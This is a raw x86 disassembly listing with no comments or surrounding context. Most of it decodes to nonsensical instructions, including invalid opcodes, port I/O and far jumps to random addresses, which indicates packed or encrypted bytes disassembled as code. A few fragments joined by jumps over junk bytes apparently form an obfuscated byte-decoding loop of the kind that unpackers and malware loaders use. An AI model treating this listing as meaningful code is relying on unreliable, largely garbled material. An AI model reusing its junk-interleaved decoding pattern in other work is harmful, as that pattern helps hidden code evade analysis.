  404fea:	nop
  404feb:	fsubr  QWORD PTR [esi]
  404fed:	lods   al,BYTE PTR ds:[esi]
  404fee:	rcr    DWORD PTR [edx-0x8],cl
  404ff1:	add    ch,BYTE PTR [ebx+0x6f]
  404ff4:	push   edi
  404ff5:	pop    ebx
  404ff6:	cmp    ebp,edi
  404ff8:	pop    ecx
  404ff9:	and    esp,DWORD PTR ds:0xd8dc0d63
  404fff:	xchg   esp,eax
  405000:	add    ch,BYTE PTR [ebx-0x293f7ad7]
  405006:	rcl    dh,cl
  405008:	add    BYTE PTR [ecx+ebx*2],ah
  40500b:	dec    ecx
  40500c:	and    al,0x42
  40500e:	int    0x6b
  405010:	and    DWORD PTR ds:0x85ebec8b,ebp
  405016:	xchg   esi,eax
  405017:	cmp    DWORD PTR [eax-0xcb313dc],ecx
  40501d:	sbb    BYTE PTR [ebx-0x6af80195],al
  405023:	xor    eax,ebx
  405025:	fs jne 0x405063
  405028:	stos   BYTE PTR es:[edi],al
  405029:	xor    BYTE PTR cs:[ecx],bl
  40502c:	xor    al,bl
  40502e:	jecxz  0x40501e
  405030:	mov    bl,0x81
  405032:	shl    BYTE PTR [ecx-0xf],0x0
  405036:	mov    ecx,DWORD PTR [esi]
  405038:	sub    ah,ch
  40503a:	bound  esp,QWORD PTR [eax+0x179308c5]
  405040:	mov    WORD PTR [esi+0x50],fs
  405043:	das    
  405044:	push   es
  405045:	inc    ebp
  405046:	adc    ebx,DWORD PTR [esi]
  405048:	fst    st(2)
  40504a:	inc    esp
  40504b:	outs   dx,DWORD PTR ds:[esi]
  40504c:	mov    ah,BYTE PTR [esi]
  40504e:	outs   dx,DWORD PTR ds:[esi]
  40504f:	shr    cl,1
  405051:	into   
  405052:	push   edi
  405053:	inc    esp
  405054:	or     cl,bl
  405056:	(bad)  
  405057:	rcl    BYTE PTR [ebp+ebp*8+0x40ebdff4],1
  40505e:	and    ecx,esp
  405060:	adc    ecx,DWORD PTR [esi]
  405062:	add    eax,0xe31bfde0
  405067:	fnstenv [edi+0x1b]
  40506a:	dec    edi
  40506b:	int    0xaf
  40506d:	jnp    0x40500a
  40506f:	cmp    eax,0xf01f7ea5
  405074:	pop    ebx
  405075:	or     eax,0x835be1bc
  40507a:	call   0x9b569c5e
  40507f:	lock sbb ax,0x2732
  405084:	shl    BYTE PTR [eax],1
  405086:	cwde   
  405087:	pop    eax
  405088:	out    0xa4,eax
  40508a:	scas   eax,DWORD PTR es:[edi]
  40508b:	mov    edi,0xbc1ac09d
  405090:	lods   al,BYTE PTR ds:[esi]
  405091:	push   ebx
  405092:	adc    al,dh
  405094:	or     eax,0xa96e04ba
  405099:	fisttp DWORD PTR [esi+0x69]
  40509c:	mov    dh,0xdf
  40509e:	mov    ds:0x8c61cbd4,al
  4050a3:	mov    ?,WORD PTR [ecx+edi*1]
  4050a6:	fs es inc edx
  4050a9:	xchg   esp,eax
  4050aa:	push   ss
  4050ab:	sub    BYTE PTR [ebx-0x5b35de3b],dl
  4050b1:	nop
  4050b2:	mov    ebp,0x26833cc7
  4050b7:	sub    ah,cl
  4050b9:	or     eax,ebp
  4050bb:	mov    ds:0xda57d8ae,eax
  4050c0:	inc    ebx
  4050c1:	push   es
  4050c2:	xor    eax,0x77f84bf3
  4050c7:	mov    edi,0xffcd8d68
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0x45328802],bh
  4050fc:	ds call 0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x405144
  405106:	aam    0x85
  405108:	ret    
  405109:	(bad)  
  40510a:	mov    bl,BYTE PTR [ebp+0x1c609cff]
  405110:	sbb    al,BYTE PTR [ecx-0x57]
  405113:	pop    ds
  405114:	cld    
  405115:	cmp    dh,BYTE PTR [ebx-0x48]
  405118:	cmp    BYTE PTR [ebx],cl
  40511a:	pushf  
  40511b:	cmp    al,BYTE PTR [esi+0x3c]
  40511e:	pop    esp
  40511f:	mov    ebp,0x27f38dae
  405124:	addr16 inc eax
  405126:	pushf  
  405127:	fs pop esp
  405129:	std    
  40512a:	dec    BYTE PTR [eax+0x11]
  40512d:	inc    ebp
  40512e:	clc    
  40512f:	cmp    ah,bh
  405131:	in     al,dx
  405132:	jl     0x405160
  405134:	cmc    
  405135:	das    
  405136:	sub    BYTE PTR [ecx],bh
  405138:	(bad)  
  405139:	retf   0xe4c8
  40513c:	dec    ebp
  40513d:	fstp   QWORD PTR [ecx-0x7e1be7e4]
  405143:	ds jg  0x4050e3
  405146:	addr16 test al,0xef
  405149:	call   0xb1fcabff
  40514e:	mov    WORD PTR [edx+0xf],ss
  405151:	arpl   di,cx
  405153:	mov    DWORD PTR [edx+0x16],ebp
  405156:	je     0x405156
  405158:	std    
  405159:	outs   dx,BYTE PTR ds:[esi]
  40515a:	xchg   ebp,eax
  40515b:	push   eax
  40515c:	push   eax
  40515d:	mov    ss,esp
  40515f:	adc    esi,DWORD PTR [ecx+eax*1]
  405162:	in     al,0x7e
  405164:	retf   0xae67
  405167:	sahf   
  405168:	rcl    DWORD PTR [eax-0x67],cl
  40516b:	stc    
  40516c:	sti    
  40516d:	dec    esi
  40516e:	in     eax,dx
  40516f:	int3   
  405170:	mov    ah,0xfc
  405172:	dec    edi
  405173:	repnz sub bl,BYTE PTR [ebx]
  405176:	sub    dh,ah
  405178:	ror    BYTE PTR [edi+0x3dadbb2],0x60
  40517f:	mov    dh,0xa8
  405181:	push   edi
  405182:	mov    dl,0x37
  405184:	sbb    ecx,ebp
  405186:	push   edx
  405187:	cwde   
  405188:	aad    0x8
  40518a:	aas    
  40518b:	bound  ebp,QWORD PTR [edx]
  40518d:	sar    BYTE PTR [eax-0x3ecb0c80],cl
  405193:	dec    esi
  405194:	hlt    
  405195:	jmp    0x405182
  405197:	xor    esi,DWORD PTR [esi]
  405199:	jne    0x405184
  40519b:	aam    0x81
  40519d:	icebp  
  40519e:	xor    ah,BYTE PTR [eax-0x41fdabbb]
  4051a4:	mov    ds:0xd1642968,al
  4051aa:	retf   
  4051ab:	jl     0x405198
  4051ad:	retf   0xd239
  4051b0:	(bad)  
  4051b1:	cmovge edi,edx
  4051b4:	push   ebx
  4051b5:	les    eax,FWORD PTR [edx-0x7d]
  4051b8:	or     eax,DWORD PTR [edi]
  4051ba:	jl     0x405164
  4051bc:	out    0x79,al
  4051be:	jge    0x40518f
  4051c0:	repnz ror BYTE PTR [esi+0x1c49d704],cl
  4051c7:	js     0x405163
  4051c9:	fs xor al,0xad
  4051cc:	cmp    edx,esi
  4051ce:	mov    eax,0x84c70551
  4051d3:	mov    edi,0x43c6bba8
  4051d8:	test   eax,0x8d2ecdb6
  4051dd:	pusha  
  4051de:	adc    DWORD PTR [eax+edx*1+0x3ed678cb],0x6c
  4051e6:	mov    esi,0x2bb55c1a
  4051eb:	sahf   
  4051ec:	ss inc eax
  4051ee:	je     0x4051f3
  4051f0:	ret    0x955e
  4051f3:	js     0x40520a
  4051f5:	jb     0x405199
  4051f7:	push   es
  4051f8:	xor    eax,0x9069e8ec
  4051fd:	es aas 
  4051ff:	xchg   ebp,eax
  405200:	ds jb  0x4051ec
  405203:	aad    0x9
  405205:	push   edi
  405206:	std    
  405207:	in     eax,dx
  405208:	ret    
  405209:	ds iret 
  40520b:	(bad)  
  40520c:	jp     0x405237
  40520e:	cwde   
  40520f:	jo     0x4051ae
  405211:	inc    esp
  405212:	and    al,0xb5
  405214:	call   0x1453:0xae822a95
  40521b:	nop
  40521c:	pop    es
  40521d:	cs mov edi,0x3a5527d9
  405223:	sbb    al,0x34
  405225:	jl     0x4051fc
  405227:	nop
  405228:	mov    ds:0xcc41d423,eax
  40522d:	rcr    DWORD PTR [ecx-0x51f6b82a],cl
  405233:	mov    ecx,0xa903d19f
  405238:	mov    ecx,0x8ac2db12
  40523d:	add    eax,0x626e0919
  405242:	fist   DWORD PTR [edi]
  405244:	pop    edx
  405245:	or     eax,0xaa374146
  40524a:	push   ss
  40524b:	jno    0x405239
  40524d:	fidiv  WORD PTR [ecx]
  40524f:	xchg   DWORD PTR [edi],edi
  405251:	and    al,0xf8
  405253:	mov    edx,0x1221a533
  405258:	outs   dx,BYTE PTR ds:[esi]
  405259:	inc    edi
  40525a:	imul   esp,DWORD PTR [ebp-0x1c70f585],0xff93dac
  405264:	pop    eax
  405265:	aad    0xe7
  405267:	and    esp,ebp
  405269:	aad    0x51
  40526b:	pop    edi
  40526c:	xchg   esi,eax
  40526d:	jns    0x405263
  40526f:	adc    eax,0x3da4bb1d
  405274:	xchg   edi,eax
  405275:	test   BYTE PTR [ecx],bh
  405277:	xchg   edx,eax
  405278:	xchg   BYTE PTR [esi+ecx*8+0x609f21bd],bh
  40527f:	and    ch,BYTE PTR [eax+0x1e]
  405282:	dec    esp
  405283:	hlt    
  405284:	pushf  
  405285:	call   ebx
  405287:	leave  
  405288:	repz (bad) 
  40528a:	mov    dh,0x50
  40528c:	mov    ds:0x97c22f72,al
  405291:	dec    esi
  405292:	out    0x87,al
  405294:	fstp   DWORD PTR [ebx+ebx*4]
  405297:	push   edi
  405298:	hlt    
  405299:	push   esp
  40529a:	inc    ecx
  40529b:	arpl   WORD PTR [esi+0x43],di
  40529e:	cs add eax,0xae26512
  4052a4:	outs   dx,DWORD PTR ds:[esi]
  4052a5:	xor    BYTE PTR [esi+0x17],bl
  4052a8:	jmp    0xf33e64f7
  4052ad:	call   ebp
  4052af:	int    0xf7
  4052b1:	stc    
  4052b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052b3:	aas    
  4052b4:	inc    edx
  4052b5:	mov    eax,0xf9619d3a
  4052ba:	das    
  4052bb:	jo     0x40523d
  4052bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052be:	push   ebp
  4052bf:	dec    eax
  4052c0:	adc    bl,BYTE PTR [ebp-0x58f3d763]
  4052c6:	and    esi,edx
  4052c8:	fistp  WORD PTR [edi]
  4052ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052cb:	gs ds (bad) 
  4052ce:	cli    
  4052cf:	sub    ebp,DWORD PTR [edx-0x6afca276]
  4052d5:	inc    esp
  4052d6:	fiadd  WORD PTR [edi]
  4052d8:	inc    ecx
  4052d9:	popa   
  4052da:	cdq    
  4052db:	cmp    edi,ebx
  4052dd:	jmp    0xcba1:0x11ff3f50
  4052e4:	inc    esi
  4052e5:	dec    edi
  4052e6:	or     BYTE PTR [eax+0x2c],dl
  4052e9:	(bad)  
  4052ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052eb:	scas   eax,DWORD PTR es:[edi]
  4052ec:	shl    BYTE PTR [ebp+0x24ddbe7],1
  4052f2:	ret    0xa999
  4052f5:	push   eax
  4052f6:	lahf   
  4052f7:	or     eax,0x52d6fe79
  4052fc:	inc    ebp
  4052fd:	xchg   esi,eax
  4052fe:	xchg   ebx,eax
  4052ff:	imul   ecx,DWORD PTR [ecx+0x71],0xffffffa1
  405303:	jp     0x405298
  405305:	xchg   DWORD PTR [edx+ebp*2],esp
  405308:	cwde   
  405309:	xchg   DWORD PTR [eax-0x62],esi
  40530c:	xor    DWORD PTR [edi-0x5e],edi
  40530f:	lock mov eax,ds:0x236f5d9d
  405315:	fidivr DWORD PTR [esi+ebp*4-0x35]
  405319:	or     al,0x7a
  40531b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40531c:	out    dx,al
  40531d:	(bad)  
  40531e:	es xchg edx,eax
  405320:	int3   
  405321:	dec    ebx
  405322:	stc    
  405323:	inc    edi
  405324:	aam    0xf0
  405326:	dec    edi
  405327:	cli    
  405328:	sub    BYTE PTR [ebx-0x1a],0xcd
  40532c:	xor    al,BYTE PTR [ebx]
  40532e:	outs   dx,DWORD PTR ds:[esi]
  40532f:	mov    eax,0xa2a12bbe
  405334:	in     eax,0xaf
  405336:	push   cs
  405337:	scas   al,BYTE PTR es:[edi]
  405338:	ins    BYTE PTR es:[edi],dx
  405339:	cld    
  40533a:	adc    dh,BYTE PTR [edi-0x582465cc]
  405340:	loop   0x4053a4
  405342:	cmp    DWORD PTR [esi+0x5a],edi
  405345:	(bad)  
  405346:	test   al,0x8c
  405348:	push   esp
  405349:	arpl   bp,di
  40534b:	dec    ecx
  40534c:	sub    ebp,DWORD PTR [eax+0x6e]
  40534f:	mov    ecx,0x95520506
  405354:	ret    0xcf7d
  405357:	rcr    DWORD PTR [esp+edi*1+0x5bc96933],1
  40535e:	lods   eax,DWORD PTR ds:[esi]
  40535f:	out    dx,eax
  405360:	jl     0x405304
  405362:	mov    cl,0x5f
  405364:	mov    ah,0x9c
  405366:	push   ds
  405367:	rcr    DWORD PTR [eax],1
  405369:	nop
  40536a:	aas    
  40536b:	jb     0x405363
  40536d:	xchg   ebx,eax
  40536e:	enter  0xd868,0x6d
  405372:	cwde   
  405373:	mov    ah,0x9f
  405375:	ja     0x40538e
  405377:	jns    0x405325
  405379:	xchg   DWORD PTR [esi+ebp*2],edx
  40537c:	int3   
  40537d:	cmp    DWORD PTR [ecx+0x8],edx
  405380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405381:	or     eax,0x579f1463
  405386:	sbb    BYTE PTR [ebx-0x59c2783b],bh
  40538c:	ret    0xfb29
  40538f:	dec    ax
  405391:	int3   
  405392:	xchg   edx,eax
  405393:	pop    eax
  405394:	dec    ebp
  405395:	repz inc ecx
  405397:	mov    ch,ah
  405399:	enter  0xe386,0xc1
  40539d:	mov    ecx,0xd6cd2bf
  4053a2:	mov    dl,BYTE PTR [ebx-0x488aa0af]
  4053a8:	ins    DWORD PTR es:[edi],dx
  4053a9:	sub    ch,BYTE PTR [ebx]
  4053ab:	jmp    DWORD PTR [ecx+0x586df0c3]
  4053b1:	rol    DWORD PTR [ebp+0x7926c4e0],1
  4053b7:	cld    
  4053b8:	outs   dx,BYTE PTR ds:[esi]
  4053b9:	mov    ss,esi
  4053bb:	div    dh
  4053bd:	jge    0x405418
  4053bf:	mov    dl,0xfa
  4053c1:	jnp    0x405432
  4053c3:	dec    edi
  4053c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c5:	out    dx,al
  4053c6:	outs   dx,BYTE PTR ds:[esi]
  4053c7:	pusha  
  4053c8:	mov    WORD PTR [edx+0x32],ss
  4053cb:	aas    
  4053cc:	jmp    0x3916:0x21476d6f
  4053d3:	pop    edi
  4053d4:	mov    al,0x30
  4053d6:	jnp    0x40540a
  4053d8:	mov    eax,DWORD PTR [ebp-0x8]
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fdiv   st(0),st
  4053ed:	mov    dh,0x9
  4053ef:	in     eax,dx
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x405386
  4053f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053fa:	sbb    esi,DWORD PTR [eax-0x56]
  4053fd:	adc    DWORD PTR ds:0x2c0adb15,edi
  405403:	sahf   
  405404:	shl    DWORD PTR [eax],1
  405406:	test   eax,0xe9f362b
  40540b:	mov    cl,0x36
  40540d:	adc    eax,0xcb9e7dc3
  405412:	je     0x4053ab
  405414:	add    ah,BYTE PTR [eax+0x65]
  405417:	loopne 0x4053fd
  405419:	in     al,0xf5
  40541b:	loop   0x405466
  40541d:	adc    al,0x57
  40541f:	push   ss
  405420:	outs   dx,DWORD PTR ds:[esi]
  405421:	(bad)  
  405422:	mov    DWORD PTR [edx-0x6d],edi
  405425:	imul   ebx,ebp,0x26
  405428:	mov    ah,0x89
  40542a:	out    0xb4,eax
  40542c:	cdq    
  40542d:	fs test ecx,esp
  405430:	retf   0xca34
  405433:	jne    0x40541a
  405435:	scas   eax,DWORD PTR es:[edi]
  405436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405437:	hlt    
  405438:	or     dh,BYTE PTR [edi+esi*1]
  40543b:	mov    DWORD PTR [ebx],ecx
  40543d:	ins    DWORD PTR es:[edi],dx
  40543e:	mov    dh,0x3a
  405440:	adc    dh,BYTE PTR [edi]
  405442:	and    BYTE PTR [ecx-0x2c],bl
  405445:	inc    eax
  405446:	mov    dh,0x71
  405448:	or     BYTE PTR [ecx-0x64],dl
  40544b:	xchg   edi,eax
  40544c:	xor    al,0xff
  40544e:	mov    cl,0x56
  405450:	sbb    eax,0x36febb72
  405455:	call   0x63b6a181
  40545a:	lds    esi,FWORD PTR [edi+ecx*8-0x411b1022]
  405461:	jge    0x40540c
  405463:	sbb    ebp,esp
  405465:	std    
  405466:	or     al,0x45
  405468:	ss sub bl,dl
  40546b:	popf   
  40546c:	int3   
  40546d:	mov    bl,0x3c
  40546f:	xchg   ebp,eax
  405470:	ror    ebp,cl
  405472:	and    eax,0x7c64a7b9
  405477:	into   
  405478:	and    bl,dh
  40547a:	ror    BYTE PTR [ecx-0x20b2aca7],0x2a
  405481:	push   ds
  405482:	pop    es
  405483:	ja     0x405501
  405485:	dec    edi
  405486:	jne    0x4054cd
  405488:	xchg   edx,esi
  40548a:	jnp    0x4054ff
  40548c:	sub    dl,ch
  40548e:	ds pop ds
  405490:	pop    ecx
  405491:	sub    DWORD PTR [edx*4-0x50cf297c],ebx
  405498:	stos   BYTE PTR es:[edi],al
  405499:	in     eax,dx
  40549a:	test   al,0x29
  40549c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40549d:	cli    
  40549e:	mov    ah,0x6b
  4054a0:	push   0xea4b0350
  4054a5:	out    dx,eax
  4054a6:	repnz pop ebp
  4054a8:	rcl    BYTE PTR [edi],0x6c
  4054ab:	hlt    
  4054ac:	cwde   
  4054ad:	dec    edx
  4054ae:	jg     0x405512
  4054b0:	push   ss
  4054b1:	inc    eax
  4054b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054b3:	xchg   esp,eax
  4054b4:	mov    edi,0xbe0c0f5c
  4054b9:	pop    esp
  4054ba:	in     eax,0x58
  4054bc:	mov    WORD PTR [edi+eax*1],cs
  4054bf:	push   0xffffff83
  4054c1:	idiv   BYTE PTR [edx]
  4054c3:	out    0x68,al
  4054c5:	and    al,0xf0
  4054c7:	stos   DWORD PTR es:[edi],eax
  4054c8:	jno    0x405475
  4054ca:	hlt    
  4054cb:	or     DWORD PTR [ebp+0x762a56bb],eax
  4054d1:	or     ch,BYTE PTR [edx+0x51]
  4054d4:	jbe    0x405536
  4054d6:	push   es
  4054d7:	xor    al,0xa
  4054d9:	or     bh,dl
  4054db:	push   esi
  4054dc:	add    ah,bh
  4054de:	cwde   
  4054df:	hlt    
  4054e0:	rsqrtps xmm1,xmm0
  4054e3:	nop
  4054e4:	mov    al,ds:0x30d71d75
  4054e9:	mov    BYTE PTR [ecx-0x488f51f1],ah
  4054ef:	cmp    esi,DWORD PTR [ebx+0x4a7e254f]
  4054f5:	mov    cl,0xe7
  4054f7:	and    DWORD PTR [ecx+0x74],edi
  4054fa:	out    dx,al
  4054fb:	jbe    0x40553d
  4054fd:	imul   eax,DWORD PTR [edi-0x53],0x89e5ffce
  405504:	add    eax,0x3a25f9c1
  405509:	dec    edx
  40550a:	mov    dh,0xe3
  40550c:	jp     0x405575
  40550e:	mov    bl,0x3
  405510:	pop    ecx
  405511:	fwait
  405512:	shr    DWORD PTR [ecx],0xb9
  405515:	inc    edx
  405516:	cli    
  405517:	xchg   DWORD PTR [edi+0x4e],esp
  40551a:	repz sahf 
  40551c:	out    0x2d,al
  40551e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40551f:	push   eax
  405520:	mov    ecx,0x3db20ee9
  405525:	pop    ds
  405526:	add    esp,DWORD PTR [edi]
  405528:	mov    DWORD PTR [edx],eax
  40552a:	repz jb 0x4054ef
  40552d:	mov    ebx,0x45d8f19b
  405532:	imul   ecx,DWORD PTR [eax-0x7d],0x895a819
  405539:	or     esp,eax
  40553b:	xor    eax,0x73fc34b6
  405540:	int3   
  405541:	stos   DWORD PTR es:[edi],eax
  405542:	push   0x844e0ecf
  405547:	daa    
  405548:	xor    eax,0x605d75a8
  40554d:	sub    ecx,edx
  40554f:	push   0xcf765334
  405554:	adc    BYTE PTR [edi-0x1fa2c27f],al
  40555a:	xlat   BYTE PTR ds:[ebx]
  40555b:	cmc    
  40555c:	push   esp
  40555d:	inc    di
  40555f:	pop    esp
  405560:	das    
  405561:	inc    ecx
  405562:	inc    ebp
  405563:	icebp  
  405564:	cmp    eax,0xf8c43bd0
  405569:	icebp  
  40556a:	data16 adc BYTE PTR [esi],bl
  40556d:	in     al,dx
  40556e:	hlt    
  40556f:	adc    DWORD PTR [ebp-0x1480a901],edx
  405575:	pop    eax
  405576:	in     eax,dx
  405577:	(bad)  
  405578:	mov    al,0x2e
  40557a:	jle    0x4055d0
  40557c:	jb     0x405575
  40557e:	hlt    
  40557f:	adc    BYTE PTR [edx+eiz*2-0x32],bl
  405583:	in     eax,0xaa
  405585:	lea    esp,[edi+0x43]
  405588:	push   ebp
  405589:	pop    eax
  40558a:	cmp    esi,ebx
  40558c:	or     esi,DWORD PTR [edx+0x29e9347d]
  405592:	xchg   esp,esp
  405594:	or     ecx,DWORD PTR [ebp+ecx*4+0x40]
  405598:	fsub   DWORD PTR [ecx+0x3735175f]
  40559e:	inc    esp
  40559f:	rcr    dh,cl
  4055a1:	add    DWORD PTR [esi-0x23841d65],edi
  4055a7:	push   esi
  4055a8:	out    dx,al
  4055a9:	addr16 push edx
  4055ab:	jno    0x4055f2
  4055ad:	iret   
  4055ae:	dec    ebx
  4055af:	cwde   
  4055b0:	xchg   dl,al
  4055b2:	js     0x4055b1
  4055b4:	ds loopne 0x4055cb
  4055b7:	and    edi,DWORD PTR [esi+0x68]
  4055ba:	stos   BYTE PTR es:[edi],al
  4055bb:	mov    ds:0x2f998743,eax
  4055c0:	jecxz  0x405553
  4055c2:	mov    eax,0x3cfb68ee
  4055c7:	jg     0x4055f1
  4055c9:	cmp    ebp,DWORD PTR [edx+0x6faf4ca]
  4055cf:	fs jnp 0x405579
  4055d2:	fnsave [edi+0x4cff56]
  4055d8:	push   0xd77149ee
  4055dd:	add    al,0x6a
  4055df:	push   edi
  4055e0:	out    dx,eax
  4055e1:	mov    ch,0x8f
  4055e3:	xor    al,0x66
  4055e5:	jge    0x4055a0
  4055e7:	cmp    al,0x5e
  4055e9:	add    bh,ch
  4055eb:	cld    
  4055ec:	scas   eax,DWORD PTR es:[edi]
  4055ed:	xchg   edx,eax
  4055ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055ef:	add    eax,0x8072d1e5
  4055f4:	pop    ebp
  4055f5:	aam    0xe5
  4055f7:	add    ecx,esp
  4055f9:	clc    
  4055fa:	adc    ah,BYTE PTR [edx+0xaa0ade8]
  405600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405601:	inc    esp
  405602:	lds    esp,FWORD PTR [edi+ebx*1-0x7eed752c]
  405609:	jbe    0x40559f
  40560b:	xchg   esp,eax
  40560c:	mov    ds:0xe64dc310,eax
  405611:	push   esi
  405612:	stc    
  405613:	inc    edi
  405614:	popf   
  405615:	in     al,0xa0
  405617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405618:	mov    bl,BYTE PTR ds:0x9fea6474
  40561e:	call   0xfd04:0x23f90d83
  405625:	test   eax,0xc920991d
  40562a:	(bad)  
  40562b:	(bad)  
  40562d:	fs stos DWORD PTR es:[edi],eax
  40562f:	lds    ebx,FWORD PTR [eax+0xef38a64]
  405635:	push   esi
  405636:	push   ds
  405637:	je     0x4055f8
  405639:	xlat   BYTE PTR ds:[ebx]
  40563a:	jnp    0x40564a
  40563c:	sub    cl,BYTE PTR [ecx+edx*1-0x4c]
  405640:	aas    
  405641:	mov    bl,0x5f
  405643:	clc    
  405644:	push   esp
  405645:	xor    edx,ebp
  405647:	ja     0x4055ed
  405649:	sub    al,0xe7
  40564b:	cmp    esi,edi
  40564d:	inc    edi
  40564e:	pushf  
  40564f:	jmp    0xc3baa135
  405654:	pop    ebp
  405655:	into   
  405656:	fidiv  WORD PTR [edx]
  405658:	outs   dx,DWORD PTR ds:[esi]
  405659:	dec    esi
  40565a:	(bad)  
  40565b:	adc    edx,DWORD PTR [ebp-0x1a]
  40565e:	jb     0x405626
  405660:	outs   dx,BYTE PTR ds:[esi]
  405661:	or     eax,0x9aee2ceb
  405666:	cld    
  405667:	add    dh,bl
  405669:	adc    DWORD PTR es:[ebx+edi*1-0x615f1cbb],eax
  405671:	mov    ds:0x8920bace,eax
  405676:	sub    dl,BYTE PTR [ebp-0x3ecf97e3]
  40567c:	add    al,0xf
  40567e:	xchg   ecx,eax
  40567f:	inc    edx
  405680:	retf   0x82a3
  405683:	cmp    edi,DWORD PTR [ebx]
  405685:	jle    0x405684
  405687:	jmp    0xa043:0xea8fbca0
  40568e:	add    eax,0x80f680eb
  405693:	jo     0x405622
  405695:	call   0xd65e:0x77d667e2
  40569c:	mov    edx,DWORD PTR [ebx+0x6843819b]
  4056a2:	(bad)  
  4056a3:	jbe    0x4056cb
  4056a5:	push   ss
  4056a6:	push   ecx
  4056a7:	fld    DWORD PTR es:[ecx]
  4056aa:	scas   al,BYTE PTR es:[edi]
  4056ab:	(bad)  
  4056ac:	push   edx
  4056ad:	shl    BYTE PTR [ecx+0x43aa317a],0xd6
  4056b4:	xchg   ebp,eax
  4056b5:	and    DWORD PTR [eax-0x3a],edx
  4056b8:	sub    BYTE PTR [ecx],dl
  4056ba:	or     bh,BYTE PTR es:[ebx+0x59c18e84]
  4056c1:	push   edx
  4056c2:	dec    ecx
  4056c3:	ds jns 0x405719
  4056c6:	and    edi,DWORD PTR [edi-0x740070d8]
  4056cc:	jge    0x4056ca
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	dec    ecx
  405713:	sub    ebp,DWORD PTR [ebx+0x783a121e]
  405719:	js     0x405768
  40571b:	jle    0x405795
  40571d:	js     0x405740
  40571f:	in     al,0xdb
  405721:	inc    ebx
  405722:	cmp    eax,0x9c64f9c0
  405727:	xchg   DWORD PTR [esi+0x77],eax
  40572a:	push   esi
  40572b:	stos   DWORD PTR es:[edi],eax
  40572c:	xor    ecx,ecx
  40572e:	sub    DWORD PTR [ebp-0x42],edi
  405731:	aaa    
  405732:	out    dx,eax
  405733:	iret   
  405734:	and    eax,0xdc4cdb0f
  405739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40573a:	adc    BYTE PTR [ecx+ebx*8],ah
  40573d:	pop    ebx
  40573e:	cmp    eax,0x30469a2
  405743:	mov    esi,0x35bf9cd9
  405748:	(bad)  
  405749:	outs   dx,DWORD PTR ds:[esi]
  40574a:	pop    es
  40574b:	jo     0x40574d
  40574d:	rol    DWORD PTR [esi-0x3ec8e684],cl
  405753:	mov    eax,0x88cfcba0
  405758:	cs xor dh,al
  40575b:	inc    eax
  40575c:	shl    BYTE PTR [ecx+ebp*2],0xc5
  405760:	inc    edx
  405761:	jbe    0x4057b7
  405763:	mov    al,ds:0x1e69e82d
  405768:	arpl   WORD PTR [ebx],sp
  40576a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40576b:	clc    
  40576c:	mov    fs,WORD PTR [ebx+0x193eaba5]
  405772:	hlt    
  405773:	adc    DWORD PTR [esi-0x18630a86],edi
  405779:	loop   0x4057b3
  40577b:	pop    es
  40577c:	mov    al,ds:0x380beea7
  405781:	sbb    al,0x24
  405783:	xor    al,dl
  405785:	inc    ebx
  405786:	ins    DWORD PTR es:[edi],dx
  405787:	push   ebx
  405788:	js     0x4057dc
  40578a:	lock in eax,dx
  40578c:	pop    esp
  40578d:	mov    bl,0xeb
  40578f:	in     eax,0x9e
  405791:	jb     0x4057d7
  405793:	add    eax,0xaa4f29b0
  405798:	jmp    FWORD PTR [edi-0x62dc7901]
  40579e:	popa   
  40579f:	and    BYTE PTR [ebx],ah
  4057a1:	xchg   DWORD PTR [ecx],ecx
  4057a3:	dec    ebp
  4057a4:	mov    dh,0x46
  4057a6:	pop    edx
  4057a7:	mov    ah,BYTE PTR [ebx]
  4057a9:	mov    es,WORD PTR ss:[esi]
  4057ac:	mov    esi,0x9cd6c7f
  4057b1:	jmp    0x40582e
